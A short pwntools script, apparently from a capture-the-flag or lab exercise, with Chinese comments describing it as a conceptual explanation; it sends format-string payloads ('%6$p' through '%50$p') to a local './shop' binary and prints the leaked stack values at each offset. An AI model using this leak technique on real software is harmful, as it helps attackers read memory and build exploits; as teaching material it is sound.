# 這是一個概念性的腳本，用來解釋邏輯
from pwn import *

io = process('./shop')

print("--- Stack Scan Results ---")
for i in range(6, 51):
    # 為每個偏移量構建一個 payload，例如 "%6$p", "%7$p"
    payload = f"%{i}$p".encode()
    
    # 發送 payload 並接收結果
    io.sendlineafter(b'>', payload)
    io.recvuntil(b'Your input is:\n')
    leaked_value = io.recvline().strip().decode()
    
    # 印出結果，方便我們分析
    print(f"Offset {i}: {leaked_value}")

io.close()
